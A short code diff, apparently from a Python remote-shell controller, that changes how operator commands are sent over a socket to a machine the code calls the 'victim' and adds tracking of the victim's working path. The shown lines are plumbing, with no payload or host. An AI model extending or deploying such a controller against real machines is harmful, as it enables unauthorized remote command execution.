@@ -110,6 +110,7 @@ def rawexec(s, command):
     sem.release()
 
 def process(s, command):
+    victimpath = ''
     breakit = False
     if command == "stop":
         s.send(bytes("stop", 'utf-8'))
@@ -128,7 +129,7 @@ def process(s, command):
     else:
         s.send(bytes(command, 'utf-8'))
         print(s.recv(20480).decode())
-    return breakit
+    return breakit, victimpath
 
 def interact(s, command):
     s.send(bytes(command, 'utf-8'))
@@ -141,7 +142,9 @@ def interact(s, command):
                 msg = input(victimpath)
                 allofem = re.split(''';(?=(?:[^'"]|'[^']*'|"[^"]*")*$)''', msg)
                 for onebyone in allofem:
-                    breakit = process(s, onebyone)
+                    breakit, path = process(s, onebyone)
+                    if not path == '':
+                        victimpath = path
         else:
             print(victimpath)
             return
